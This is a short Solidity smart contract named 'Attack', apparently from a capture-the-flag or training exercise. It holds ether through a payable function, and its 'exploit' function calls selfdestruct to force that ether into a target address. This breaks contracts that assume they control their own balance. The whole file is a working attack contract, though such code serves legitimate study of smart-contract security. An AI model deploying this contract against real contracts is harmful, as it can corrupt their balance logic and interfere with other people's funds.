pragma solidity ^0.8.0;

contract Attack{
uint256 public amount;
function exploit(address _addr)public {

    selfdestruct(payable(_addr));
}

function storageSomeMoney() public payable{
    amount = msg.value;
}


}